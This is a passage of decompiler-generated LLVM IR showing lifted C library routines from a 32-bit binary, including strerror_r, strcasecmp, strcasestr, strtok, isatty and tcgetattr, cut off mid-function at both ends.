
dec_label_pc_804f36d:                             ; preds = %dec_label_pc_804f365, %dec_label_pc_804f359, %dec_label_pc_804f369.preheader
  %v0_804f36d = phi i32 [ %v0_804f387, %dec_label_pc_804f369.preheader ], [ %v1_804f359, %dec_label_pc_804f359 ], [ %v1_804f365, %dec_label_pc_804f365 ]
  %v1_804f36d = add i32 %v0_804f36d, 1
  br label %dec_label_pc_804f374

dec_label_pc_804f374:                             ; preds = %dec_label_pc_804f341, %dec_label_pc_804f36d
  %v0_804f36927.in.in.in = phi i32 [ %v1_804f36d, %dec_label_pc_804f36d ], [ %v1_804f341, %dec_label_pc_804f341 ]
  %v0_804f387 = phi i32 [ %v1_804f36d, %dec_label_pc_804f36d ], [ %v1_804f341, %dec_label_pc_804f341 ]
  %v0_804f36927.in.in = inttoptr i32 %v0_804f36927.in.in.in to i8*
  %v0_804f36927.in = load i8, i8* %v0_804f36927.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_804f36927.in, %v3_804f336
  %v1_804f374 = icmp eq i1 %storemerge4, false
  br i1 %v1_804f374, label %dec_label_pc_804f369.preheader, label %dec_label_pc_804f376

dec_label_pc_804f376:                             ; preds = %dec_label_pc_804f374
  %v1_804f37e = add i32 %v0_804f387, 1
  %v2_804f37e = inttoptr i32 %v1_804f37e to i8*
  %v3_804f37e = load i8, i8* %v2_804f37e, align 1
  %v3_804f382 = load i8, i8* %v2_804f382, align 1
  %v1_804f38a = add i32 %v0_804f387, -1
  %v12_804f38d = icmp eq i8 %v3_804f37e, %v3_804f382
  %v1_804f38f = icmp eq i1 %v12_804f38d, false
  br i1 %v1_804f38f, label %dec_label_pc_804f3b9, label %dec_label_pc_804f391.preheader

dec_label_pc_804f391.preheader:                   ; preds = %dec_label_pc_804f376
  %v1_804f39110 = icmp eq i8 %v3_804f37e, 0
  br i1 %v1_804f39110, label %dec_label_pc_804f3c3, label %dec_label_pc_804f395

dec_label_pc_804f395:                             ; preds = %dec_label_pc_804f391.preheader, %dec_label_pc_804f3b5
  %v0_804f3a8 = phi i32 [ %v1_804f3a8, %dec_label_pc_804f3b5 ], [ %v1_804f382, %dec_label_pc_804f391.preheader ]
  %v0_804f3a5 = phi i32 [ %v1_804f3a5, %dec_label_pc_804f3b5 ], [ %v1_804f37e, %dec_label_pc_804f391.preheader ]
  %v1_804f395 = add i32 %v0_804f3a5, 1
  %v2_804f395 = inttoptr i32 %v1_804f395 to i8*
  %v3_804f395 = load i8, i8* %v2_804f395, align 1
  %v1_804f399 = add i32 %v0_804f3a8, 1
  %v2_804f399 = inttoptr i32 %v1_804f399 to i8*
  %v3_804f399 = load i8, i8* %v2_804f399, align 1
  %v12_804f39d = icmp eq i8 %v3_804f395, %v3_804f399
  %v1_804f39f = icmp eq i1 %v12_804f39d, false
  br i1 %v1_804f39f, label %dec_label_pc_804f3b9, label %dec_label_pc_804f3a1

dec_label_pc_804f3a1:                             ; preds = %dec_label_pc_804f395
  %v1_804f3a1 = icmp eq i8 %v3_804f399, 0
  br i1 %v1_804f3a1, label %dec_label_pc_804f3c3, label %dec_label_pc_804f3a5

dec_label_pc_804f3a5:                             ; preds = %dec_label_pc_804f3a1
  %v1_804f3a5 = add i32 %v0_804f3a5, 2
  %v1_804f3a8 = add i32 %v0_804f3a8, 2
  %v1_804f3ab = inttoptr i32 %v1_804f3a5 to i8*
  %v2_804f3ab = load i8, i8* %v1_804f3ab, align 1
  %v1_804f3ae = inttoptr i32 %v1_804f3a8 to i8*
  %v2_804f3ae = load i8, i8* %v1_804f3ae, align 1
  %v12_804f3b1 = icmp eq i8 %v2_804f3ab, %v2_804f3ae
  %v1_804f3b3 = icmp eq i1 %v12_804f3b1, false
  br i1 %v1_804f3b3, label %dec_label_pc_804f3b9, label %dec_label_pc_804f3b5

dec_label_pc_804f3b5:                             ; preds = %dec_label_pc_804f3a5
  %v1_804f391 = icmp eq i8 %v2_804f3ae, 0
  br i1 %v1_804f391, label %dec_label_pc_804f3c3, label %dec_label_pc_804f395

dec_label_pc_804f3b9:                             ; preds = %dec_label_pc_804f3a5, %dec_label_pc_804f395, %dec_label_pc_804f376
  %v0_804f3b9.in = phi i8 [ %v3_804f382, %dec_label_pc_804f376 ], [ %v2_804f3ae, %dec_label_pc_804f3a5 ], [ %v3_804f399, %dec_label_pc_804f395 ]
  %v1_804f3b9 = icmp eq i8 %v0_804f3b9.in, 0
  %v1_804f3bb = icmp eq i1 %v1_804f3b9, false
  br i1 %v1_804f3bb, label %dec_label_pc_804f34c, label %dec_label_pc_804f3c3

dec_label_pc_804f3c1:                             ; preds = %dec_label_pc_804f31f, %dec_label_pc_804f361, %dec_label_pc_804f355
  br label %dec_label_pc_804f3c3

dec_label_pc_804f3c3:                             ; preds = %dec_label_pc_804f391.preheader, %dec_label_pc_804f3b9, %dec_label_pc_804f3a1, %dec_label_pc_804f3b5, %entry, %dec_label_pc_804f32f, %dec_label_pc_804f3c1
  %storemerge2 = phi i32 [ 0, %dec_label_pc_804f3c1 ], [ %v1_804f31f, %dec_label_pc_804f32f ], [ %arg1, %entry ], [ %v1_804f38a, %dec_label_pc_804f3b5 ], [ %v1_804f38a, %dec_label_pc_804f3a1 ], [ %v1_804f38a, %dec_label_pc_804f3b9 ], [ %v1_804f38a, %dec_label_pc_804f391.preheader ]
  store i32 %v0_804f307, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_804f3ae, { 0, 2, 1 }
  uselistorder i32 %v1_804f3a8, { 1, 0 }
  uselistorder i32 %v1_804f3a5, { 1, 0 }
  uselistorder i8 %v3_804f399, { 0, 2, 1 }
  uselistorder i8 %v3_804f37e, { 1, 0 }
  uselistorder i32 %v0_804f387, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_804f36d, { 1, 0 }
  uselistorder i8 %v2_804f366, { 1, 0 }
  uselistorder i32 %v1_804f365, { 0, 2, 1 }
  uselistorder i8 %v2_804f35a, { 1, 0 }
  uselistorder i32 %v0_804f35956, { 1, 0 }
  uselistorder i32 %v1_804f341, { 1, 0 }
  uselistorder i32 %v1_804f31f, { 0, 2, 1 }
  uselistorder i8 %v2_804f313, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f3c3, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_804f3c1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f395, { 1, 0 }
  uselistorder label %dec_label_pc_804f374, { 1, 0 }
  uselistorder label %dec_label_pc_804f355, { 1, 0 }
  uselistorder label %dec_label_pc_804f369.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804f3dd = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804f3e2 = load i32, i32* @ebx, align 4
  ret i32 %v0_804f3e2
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804f3fe = icmp ugt i32 %arg1, 124
  br i1 %v6_804f3fe, label %dec_label_pc_804f41b, label %dec_label_pc_804f400

dec_label_pc_804f400:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8056ec0.212 to i32), i32* @esi, align 4
  %v1_804f4104 = icmp eq i32 %arg1, 0
  %v1_804f41211 = icmp eq i1 %v1_804f4104, false
  br i1 %v1_804f41211, label %dec_label_pc_804f409, label %dec_label_pc_804f414

dec_label_pc_804f409:                             ; preds = %dec_label_pc_804f400, %dec_label_pc_804f409
  %v0_804f40c = phi i32 [ %v3_804f40c, %dec_label_pc_804f409 ], [ %arg1, %dec_label_pc_804f400 ]
  %v0_804f40f = phi i32 [ %v1_804f40f, %dec_label_pc_804f409 ], [ ptrtoint ([8 x i8]* @global_var_8056ec0.212 to i32), %dec_label_pc_804f400 ]
  %v1_804f409 = inttoptr i32 %v0_804f40f to i8*
  %v2_804f409 = load i8, i8* %v1_804f409, align 1
  %v7_804f409 = icmp eq i8 %v2_804f409, 0
  %v2_804f40c = zext i1 %v7_804f409 to i32
  %v3_804f40c = add i32 %v2_804f40c, %v0_804f40c
  %v16_804f40c = icmp eq i32 %v3_804f40c, 0
  %v1_804f40f = add i32 %v0_804f40f, 1
  store i32 %v1_804f40f, i32* @esi, align 4
  %v1_804f412 = icmp eq i1 %v16_804f40c, false
  br i1 %v1_804f412, label %dec_label_pc_804f409, label %dec_label_pc_804f414

dec_label_pc_804f414:                             ; preds = %dec_label_pc_804f409, %dec_label_pc_804f400
  %v0_804f416 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8056ec0.212 to i32), %dec_label_pc_804f400 ], [ %v1_804f40f, %dec_label_pc_804f409 ]
  store i32 0, i32* @ebp, align 4
  %v1_804f416 = inttoptr i32 %v0_804f416 to i8*
  %v2_804f416 = load i8, i8* %v1_804f416, align 1
  %v3_804f416 = icmp eq i8 %v2_804f416, 0
  %v1_804f419 = icmp eq i1 %v3_804f416, false
  br i1 %v1_804f419, label %dec_label_pc_804f414.dec_label_pc_804f44a_crit_edge, label %dec_label_pc_804f41b

dec_label_pc_804f414.dec_label_pc_804f44a_crit_edge: ; preds = %dec_label_pc_804f414
  br label %dec_label_pc_804f44a

dec_label_pc_804f41b:                             ; preds = %dec_label_pc_804f414, %entry
  store i32 22, i32* @ebp, align 4
  %v1_804f423 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_804f42f = bitcast i32* %stack_var_-17 to i8*
  %v7_804f42f = call i32 @_uintmaxtostr(i8* %v6_804f42f, i32 %arg1, i32 %v1_804f423, i32 -10, i32 0)
  %v1_804f437 = add i32 %v7_804f42f, -14
  store i32 %v1_804f437, i32* @esi, align 4
  %v5_804f441 = inttoptr i32 %v1_804f437 to i8*
  store i8* %v5_804f441, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804f437 to i16*
  %v6_804f442 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8056e96.213 to i32), i32 14)
  %v0_804f459.pre = load i32, i32* @edi, align 4
  %v0_804f45b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f44a

dec_label_pc_804f44a:                             ; preds = %dec_label_pc_804f414.dec_label_pc_804f44a_crit_edge, %dec_label_pc_804f41b
  %v0_804f45b = phi i32 [ %v0_804f416, %dec_label_pc_804f414.dec_label_pc_804f44a_crit_edge ], [ %v0_804f45b.pre, %dec_label_pc_804f41b ]
  %v0_804f459 = phi i32 [ %arg3, %dec_label_pc_804f414.dec_label_pc_804f44a_crit_edge ], [ %v0_804f459.pre, %dec_label_pc_804f41b ]
  %v4_804f44c = icmp eq i32 %arg2, 0
  %v1_804f451 = icmp eq i1 %v4_804f44c, false
  %v2_804f459 = select i1 %v1_804f451, i32 %v0_804f459, i32 0
  store i32 %v2_804f459, i32* @edi, align 4
  %v5_804f45b = inttoptr i32 %v0_804f45b to i8*
  store i8* %v5_804f45b, i8** %stack_var_-108, align 4
  %v3_804f45c = call i32 @strlen(i8* %v5_804f45b)
  %v1_804f464 = add i32 %v3_804f45c, 1
  store i32 %v1_804f464, i32* %ebx.global-to-local, align 4
  %v1_804f467 = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_804f464, %v1_804f467
  br i1 %tmp46, label %dec_label_pc_804f46b, label %dec_label_pc_804f472

dec_label_pc_804f46b:                             ; preds = %dec_label_pc_804f44a
  store i32 %v1_804f467, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804f472

dec_label_pc_804f472:                             ; preds = %dec_label_pc_804f44a, %dec_label_pc_804f46b
  %v0_804f477 = phi i32 [ %v1_804f464, %dec_label_pc_804f44a ], [ %v1_804f467, %dec_label_pc_804f46b ]
  %v1_804f472 = icmp eq i32 %v0_804f477, 0
  br i1 %v1_804f472, label %dec_label_pc_804f48e, label %dec_label_pc_804f476

dec_label_pc_804f476:                             ; preds = %dec_label_pc_804f472
  %v0_804f478 = load i32, i32* @esi, align 4
  %v8_804f479 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804f479, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804f47d = call i32 @memcpy(i16* %tmp45, i32 %v0_804f478, i32 %v0_804f477)
  %v1_804f489 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f489 = add i32 %arg2, -1
  %v3_804f489 = add i32 %v2_804f489, %v1_804f489
  %v4_804f489 = inttoptr i32 %v3_804f489 to i8*
  store i8 0, i8* %v4_804f489, align 1
  br label %dec_label_pc_804f48e

dec_label_pc_804f48e:                             ; preds = %dec_label_pc_804f472, %dec_label_pc_804f476
  %v0_804f48e = load i32, i32* @ebp, align 4
  %v1_804f48e = icmp eq i32 %v0_804f48e, 0
  br i1 %v1_804f48e, label %dec_label_pc_804f499, label %dec_label_pc_804f492

dec_label_pc_804f492:                             ; preds = %dec_label_pc_804f48e
  %v0_804f492 = load i8*, i8** %stack_var_-108, align 4
  %v1_804f492 = ptrtoint i8* %v0_804f492 to i32
  %v2_804f492 = call i32 @__errno_location(i32 %v1_804f492)
  %v0_804f497 = load i32, i32* @ebp, align 4
  %v2_804f497 = inttoptr i32 %v2_804f492 to i32*
  store i32 %v0_804f497, i32* %v2_804f497, align 4
  %v0_804f49c.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f499

dec_label_pc_804f499:                             ; preds = %dec_label_pc_804f48e, %dec_label_pc_804f492
  %v0_804f49c = phi i32 [ 0, %dec_label_pc_804f48e ], [ %v0_804f49c.pre, %dec_label_pc_804f492 ]
  ret i32 %v0_804f49c

; uselistorder directives
  uselistorder i32 %v1_804f467, { 1, 2, 0 }
  uselistorder i32 %v1_804f464, { 1, 0, 2 }
  uselistorder i32 %v1_804f437, { 1, 0, 2 }
  uselistorder i32 %v1_804f40f, { 0, 2, 1 }
  uselistorder i32 %v3_804f40c, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8056ec0.212 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f499, { 1, 0 }
  uselistorder label %dec_label_pc_804f48e, { 1, 0 }
  uselistorder label %dec_label_pc_804f472, { 1, 0 }
  uselistorder label %dec_label_pc_804f44a, { 1, 0 }
  uselistorder label %dec_label_pc_804f409, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804f4b4 = inttoptr i32 %arg2 to i8*
  %v3_804f4b4 = call i32 @memmove(i8* %v2_804f4b4, i32 %arg1)
  ret i32 %v3_804f4b4
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f4be = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f4be, i32* @ecx, align 4
  %v0_804f4c8 = load i32, i32* bitcast (i32** @global_var_8059ac0.215 to i32*), align 64
  br label %dec_label_pc_804f4ce

dec_label_pc_804f4ce:                             ; preds = %dec_label_pc_804f4eb, %entry
  %v0_804f4f17 = phi i32 [ %v0_804f4f18, %dec_label_pc_804f4eb ], [ 0, %entry ]
  %v0_804f4eb = phi i32 [ %v1_804f4eb, %dec_label_pc_804f4eb ], [ %arg2, %entry ]
  %v0_804f4ec = phi i32 [ %v1_804f4ec, %dec_label_pc_804f4eb ], [ %v4_804f4be, %entry ]
  %v12_804f4ce = icmp eq i32 %v0_804f4ec, %v0_804f4eb
  %.pre = inttoptr i32 %v0_804f4ec to i8*
  br i1 %v12_804f4ce, label %dec_label_pc_804f4e6, label %dec_label_pc_804f4d2

dec_label_pc_804f4d2:                             ; preds = %dec_label_pc_804f4ce
  %v2_804f4d2 = load i8, i8* %.pre, align 1
  %v3_804f4d2 = zext i8 %v2_804f4d2 to i32
  %v2_804f4d5 = mul nuw nsw i32 %v3_804f4d2, 2
  %v3_804f4d5 = add i32 %v2_804f4d5, %v0_804f4c8
  %v4_804f4d5 = inttoptr i32 %v3_804f4d5 to i16*
  %v5_804f4d5 = load i16, i16* %v4_804f4d5, align 2
  %v6_804f4d5 = sext i16 %v5_804f4d5 to i32
  %v1_804f4d9 = inttoptr i32 %v0_804f4eb to i8*
  %v2_804f4d9 = load i8, i8* %v1_804f4d9, align 1
  %v3_804f4d9 = zext i8 %v2_804f4d9 to i32
  %v2_804f4dc = mul nuw nsw i32 %v3_804f4d9, 2
  %v3_804f4dc = add i32 %v2_804f4dc, %v0_804f4c8
  %v4_804f4dc = inttoptr i32 %v3_804f4dc to i16*
  %v5_804f4dc = load i16, i16* %v4_804f4dc, align 2
  %v6_804f4dc = sext i16 %v5_804f4dc to i32
  %v2_804f4e0 = sub nsw i32 %v6_804f4d5, %v6_804f4dc
  %v12_804f4e0 = icmp eq i32 %v2_804f4e0, 0
  store i32 %v2_804f4e0, i32* @edx, align 4
  %v1_804f4e4 = icmp eq i1 %v12_804f4e0, false
  br i1 %v1_804f4e4, label %dec_label_pc_804f4ef, label %dec_label_pc_804f4e6

dec_label_pc_804f4e6:                             ; preds = %dec_label_pc_804f4ce, %dec_label_pc_804f4d2
  %v0_804f4f18 = phi i32 [ %v2_804f4e0, %dec_label_pc_804f4d2 ], [ %v0_804f4f17, %dec_label_pc_804f4ce ]
  %v2_804f4e6 = load i8, i8* %.pre, align 1
  %v3_804f4e6 = icmp eq i8 %v2_804f4e6, 0
  br i1 %v3_804f4e6, label %dec_label_pc_804f4ef, label %dec_label_pc_804f4eb

dec_label_pc_804f4eb:                             ; preds = %dec_label_pc_804f4e6
  %v1_804f4eb = add i32 %v0_804f4eb, 1
  %v1_804f4ec = add i32 %v0_804f4ec, 1
  store i32 %v1_804f4ec, i32* @ecx, align 4
  br label %dec_label_pc_804f4ce

dec_label_pc_804f4ef:                             ; preds = %dec_label_pc_804f4e6, %dec_label_pc_804f4d2
  %v0_804f4f1 = phi i32 [ %v0_804f4f18, %dec_label_pc_804f4e6 ], [ %v2_804f4e0, %dec_label_pc_804f4d2 ]
  ret i32 %v0_804f4f1

; uselistorder directives
  uselistorder i32 %v1_804f4ec, { 1, 0 }
  uselistorder i32 %v0_804f4f18, { 1, 0 }
  uselistorder i32 %v2_804f4e0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f4ec, { 2, 1, 0 }
  uselistorder i32 %v0_804f4eb, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f4e6, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f4f7 = load i32, i32* @ebx, align 4
  %v4_804f4fb = ptrtoint i8* %arg1 to i32
  %v1_804f50718 = inttoptr i32 %arg2 to i8*
  %v2_804f5071931 = load i8, i8* %v1_804f50718, align 1
  %v4_804f5092335 = icmp eq i8 %v2_804f5071931, 0
  %v1_804f50b2436 = icmp eq i1 %v4_804f5092335, false
  br i1 %v1_804f50b2436, label %dec_label_pc_804f511.lr.ph.lr.ph, label %dec_label_pc_804f541

dec_label_pc_804f511.lr.ph.lr.ph:                 ; preds = %entry
  %v3_804f5072032 = zext i8 %v2_804f5071931 to i32
  %v4_804f507.pre.pre = load i32, i32* @eax, align 4
  %v5_804f5072133 = and i32 %v4_804f507.pre.pre, -256
  %v6_804f5072234 = or i32 %v3_804f5072032, %v5_804f5072133
  %v4_804f511.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f511.lr.ph

dec_label_pc_804f511.lr.ph:                       ; preds = %dec_label_pc_804f511.lr.ph.lr.ph, %dec_label_pc_804f53c
  %v4_804f511.pre = phi i32 [ %v4_804f511.pre.pre, %dec_label_pc_804f511.lr.ph.lr.ph ], [ %v0_804f51e, %dec_label_pc_804f53c ]
  %v6_804f5072239 = phi i32 [ %v6_804f5072234, %dec_label_pc_804f511.lr.ph.lr.ph ], [ %v6_804f50722, %dec_label_pc_804f53c ]
  %v2_804f5071938 = phi i8 [ %v2_804f5071931, %dec_label_pc_804f511.lr.ph.lr.ph ], [ %v2_804f50719, %dec_label_pc_804f53c ]
  %v0_804f53c37 = phi i32 [ %v4_804f4fb, %dec_label_pc_804f511.lr.ph.lr.ph ], [ %v1_804f53c, %dec_label_pc_804f53c ]
  br label %dec_label_pc_804f511

dec_label_pc_804f511:                             ; preds = %dec_label_pc_804f511.lr.ph, %dec_label_pc_804f531
  %v4_804f511 = phi i32 [ %v4_804f511.pre, %dec_label_pc_804f511.lr.ph ], [ %v4_804f51144, %dec_label_pc_804f531 ]
  %v6_804f50729 = phi i32 [ %v6_804f5072239, %dec_label_pc_804f511.lr.ph ], [ %v6_804f507, %dec_label_pc_804f531 ]
  %v2_804f50728 = phi i8 [ %v2_804f5071938, %dec_label_pc_804f511.lr.ph ], [ %v2_804f507, %dec_label_pc_804f531 ]
  %v1_804f50727 = phi i8* [ %v1_804f50718, %dec_label_pc_804f511.lr.ph ], [ %v1_804f507, %dec_label_pc_804f531 ]
  %v0_804f53126 = phi i32 [ %arg2, %dec_label_pc_804f511.lr.ph ], [ %v1_804f531, %dec_label_pc_804f531 ]
  %v0_804f53225 = phi i32 [ %v0_804f53c37, %dec_label_pc_804f511.lr.ph ], [ %v1_804f532, %dec_label_pc_804f531 ]
  %v1_804f511 = inttoptr i32 %v0_804f53225 to i8*
  %v2_804f511 = load i8, i8* %v1_804f511, align 1
  %v3_804f511 = zext i8 %v2_804f511 to i32
  %v5_804f511 = and i32 %v4_804f511, -256
  %v6_804f511 = or i32 %v5_804f511, %v3_804f511
  %v15_804f517 = icmp eq i8 %v2_804f50728, %v2_804f511
  br i1 %v15_804f517, label %dec_label_pc_804f531, label %dec_label_pc_804f51b

dec_label_pc_804f51b:                             ; preds = %dec_label_pc_804f511
  %v2_804f51b = load i8, i8* %v1_804f511, align 1
  %v3_804f51b = zext i8 %v2_804f51b to i32
  %v0_804f51e = load i32, i32* bitcast (i32** @global_var_8059ac0.215 to i32*), align 64
  %v2_804f524 = load i8, i8* %v1_804f50727, align 1
  %v3_804f524 = zext i8 %v2_804f524 to i32
  %v2_804f527 = mul nuw nsw i32 %v3_804f51b, 2
  %v3_804f527 = add i32 %v2_804f527, %v0_804f51e
  %v4_804f527 = inttoptr i32 %v3_804f527 to i16*
  %v5_804f527 = load i16, i16* %v4_804f527, align 2
  %v6_804f527 = zext i16 %v5_804f527 to i32
  %v4_804f52b = mul nuw nsw i32 %v3_804f524, 2
  %v5_804f52b = add i32 %v4_804f52b, %v0_804f51e
  %v6_804f52b = inttoptr i32 %v5_804f52b to i16*
  %v7_804f52b = load i16, i16* %v6_804f52b, align 2
  %v18_804f52b = icmp eq i16 %v5_804f527, %v7_804f52b
  %v1_804f52f = icmp eq i1 %v18_804f52b, false
  br i1 %v1_804f52f, label %dec_label_pc_804f535, label %dec_label_pc_804f531

dec_label_pc_804f531:                             ; preds = %dec_label_pc_804f51b, %dec_label_pc_804f511
  %v4_804f51144 = phi i32 [ %v0_804f51e, %dec_label_pc_804f51b ], [ %v6_804f511, %dec_label_pc_804f511 ]
  %v4_804f5076 = phi i32 [ %v6_804f527, %dec_label_pc_804f51b ], [ %v6_804f50729, %dec_label_pc_804f511 ]
  %v1_804f531 = add i32 %v0_804f53126, 1
  %v1_804f532 = add i32 %v0_804f53225, 1
  %v1_804f507 = inttoptr i32 %v1_804f531 to i8*
  %v2_804f507 = load i8, i8* %v1_804f507, align 1
  %v3_804f507 = zext i8 %v2_804f507 to i32
  %v5_804f507 = and i32 %v4_804f5076, -256
  %v6_804f507 = or i32 %v3_804f507, %v5_804f507
  %v4_804f509 = icmp eq i8 %v2_804f507, 0
  %v1_804f50b = icmp eq i1 %v4_804f509, false
  br i1 %v1_804f50b, label %dec_label_pc_804f511, label %dec_label_pc_804f541

dec_label_pc_804f535:                             ; preds = %dec_label_pc_804f51b
  %v4_804f535 = icmp eq i8 %v2_804f511, 0
  br i1 %v4_804f535, label %dec_label_pc_804f53f, label %dec_label_pc_804f53c

dec_label_pc_804f53c:                             ; preds = %dec_label_pc_804f535
  %v1_804f53c = add i32 %v0_804f53c37, 1
  %v2_804f50719 = load i8, i8* %v1_804f50718, align 1
  %v3_804f50720 = zext i8 %v2_804f50719 to i32
  %v5_804f50721 = and i32 %v6_804f527, 65280
  %v6_804f50722 = or i32 %v3_804f50720, %v5_804f50721
  %v4_804f50923 = icmp eq i8 %v2_804f50719, 0
  %v1_804f50b24 = icmp eq i1 %v4_804f50923, false
  br i1 %v1_804f50b24, label %dec_label_pc_804f511.lr.ph, label %dec_label_pc_804f541

dec_label_pc_804f53f:                             ; preds = %dec_label_pc_804f535
  br label %dec_label_pc_804f541

dec_label_pc_804f541:                             ; preds = %dec_label_pc_804f53c, %entry, %dec_label_pc_804f531, %dec_label_pc_804f53f
  %storemerge = phi i32 [ 0, %dec_label_pc_804f53f ], [ %v4_804f4fb, %entry ], [ %v1_804f53c, %dec_label_pc_804f53c ], [ %v0_804f53c37, %dec_label_pc_804f531 ]
  store i32 %v0_804f4f7, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804f50719, { 1, 2, 0 }
  uselistorder i8 %v2_804f507, { 1, 2, 0 }
  uselistorder i8* %v1_804f507, { 1, 0 }
  uselistorder i32 %v0_804f51e, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804f53225, { 1, 0 }
  uselistorder i8 %v2_804f5071931, { 0, 2, 1 }
  uselistorder i8* %v1_804f50718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f541, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804f511, { 1, 0 }
  uselistorder label %dec_label_pc_804f511.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804f558 = inttoptr i32 %arg1 to i8*
  %v4_804f558 = call i32 @strtok_r(i8* %v3_804f558, i32 %arg2, i32 ptrtoint (i32* @global_var_805fb40.216 to i32))
  ret i32 %v4_804f558
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804f570 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804f575 = icmp eq i32 %v3_804f570, 0
  %v1_804f577 = zext i1 %v1_804f575 to i32
  ret i32 %v1_804f577
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f584 = load i32, i32* @esi, align 4
  %v0_804f585 = load i32, i32* @ebx, align 4
  store i32 %v0_804f585, i32* %stack_var_-8, align 4
  %v2_804f589 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f589, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804f59b = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804f589)
  store i32 %v3_804f59b, i32* %eax.global-to-local, align 4
  store i32 %v3_804f59b, i32* @esi, align 4
  %v1_804f5a5 = icmp eq i32 %v3_804f59b, 0
  %v1_804f5a7 = icmp eq i1 %v1_804f5a5, false
  br i1 %v1_804f5a7, label %dec_label_pc_804f5ec, label %dec_label_pc_804f5a9

dec_label_pc_804f5a9:                             ; preds = %entry
  %v3_804f5a9 = load i32, i32* %stack_var_-44, align 4
  %v1_804f5ad = load i32, i32* @ebx, align 4
  %v2_804f5ad = inttoptr i32 %v1_804f5ad to i32*
  store i32 %v3_804f5a9, i32* %v2_804f5ad, align 4
  %v1_804f5b3 = load i32, i32* @ebx, align 4
  %v2_804f5b3 = add i32 %v1_804f5b3, 4
  %v3_804f5b3 = inttoptr i32 %v2_804f5b3 to i32*
  %v1_804f5ba = load i32, i32* @ebx, align 4
  %v2_804f5ba = add i32 %v1_804f5ba, 8
  %v3_804f5ba = inttoptr i32 %v2_804f5ba to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804f5c1 = load i32, i32* @ebx, align 4
  %v2_804f5c1 = add i32 %v1_804f5c1, 12
  %v3_804f5c1 = inttoptr i32 %v2_804f5c1 to i32*
  store i32 %tmp3, i32* %v3_804f5c1, align 4
  %v4_804f5c4 = zext i8 %tmp to i32
  %v5_804f5c4 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f5c4 = and i32 %v5_804f5c4, -256
  %v7_804f5c4 = or i32 %v6_804f5c4, %v4_804f5c4
  store i32 %v7_804f5c4, i32* %eax.global-to-local, align 4
  %v2_804f5c8 = load i32, i32* @ebx, align 4
  %v3_804f5c8 = add i32 %v2_804f5c8, 16
  %v4_804f5c8 = inttoptr i32 %v3_804f5c8 to i8*
  store i8 %tmp, i8* %v4_804f5c8, align 1
  %v0_804f5cb = load i32, i32* %eax.global-to-local, align 4
